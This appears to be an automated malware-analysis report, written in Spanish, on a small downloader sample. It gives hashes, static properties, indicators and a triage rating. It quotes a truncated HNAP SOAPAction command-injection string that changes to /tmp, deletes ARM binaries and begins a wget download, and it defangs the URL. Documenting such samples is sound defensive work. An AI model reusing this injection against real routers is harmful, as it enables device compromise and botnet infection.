# 🧬 Payload Analysis

`39e2199e534dd2e9676170228389a70e595b51f8a8ee791d186fed014dc372a9`

## 📌 Resumen

Texto ASCII de 338 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `GetDeviceSettings` en `hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `rm main_arm main_arm7 arm7 arm`
2. `wget ht` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/39e2199e534dd2e9676170228389a70e595b51f8a8ee791d186fed014dc372a9.md](../../../../../malware-like/oraculo/downloader/39e2199e534dd2e9676170228389a70e595b51f8a8ee791d186fed014dc372a9.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `39e2199e534dd2e9676170228389a70e595b51f8a8ee791d186fed014dc372a9`
- **SHA1:** `47fa7ca7be263c9e2432a5a610b840b9485cc3ec`
- **MD5:** `d8df856467e7c4936c5b5928f166907e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 338 B |
| Entropía | 5.19 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bht
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/ | strings |
| ip | 201.51.13.XXX | static_analysis |
| ip | 190.179.168.XXX | static_analysis |
| command | SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bht | strings |
| hash | 39e2199e534dd2e9676170228389a70e595b51f8a8ee791d186fed014dc372a9 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
